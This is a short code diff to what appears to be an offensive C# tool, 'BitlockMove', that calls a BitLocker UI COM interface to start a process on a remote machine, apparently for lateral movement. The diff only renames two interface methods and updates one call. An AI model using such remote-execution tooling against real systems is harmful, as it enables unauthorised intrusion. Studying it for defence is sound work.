@@ -146,11 +146,11 @@ namespace BitlockMove
         {
             [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
             [DispId(1)]
-            int BDEUIProcessStart([In] int enumBitlockMoveApp, [In] int enumProcStartMode, [In][MarshalAs(UnmanagedType.BStr)] string bstrStartParam);
+            int BdeUIProcessStart([In] int enumBitlockMoveApp, [In] int enumProcStartMode, [In][MarshalAs(UnmanagedType.BStr)] string bstrStartParam);
 
             [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
             [DispId(2)]
-            void BDEUIContextTrigger([In] int enumBdeSvcApi, [In][MarshalAs(UnmanagedType.BStr)] string bstrBdeSvcApiParam, [In] bool bSynchronous);
+            void BdeUIContextTrigger([In] int enumBdeSvcApi, [In][MarshalAs(UnmanagedType.BStr)] string bstrBdeSvcApiParam, [In] bool bSynchronous);
 
             [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime)]
             [DispId(3)]
@@ -405,8 +405,8 @@ namespace BitlockMove
                 IBDEUILauncher server = (IBDEUILauncher)Marshal.GetObjectForIUnknown(qis[0].pItf);
 
                 Console.WriteLine("[*] Calling BitlockMoveProcessStart on remote machine...");
-                int result = server.BDEUIProcessStart(4, 0, path);
-                Console.WriteLine($"[*] BDEUIProcessStart returned: {result}");
+                int result = server.BdeUIProcessStart(4, 0, path);
+                Console.WriteLine($"[*] BdeUIProcessStart returned: {result}");
             }
             catch (Exception e)
             {
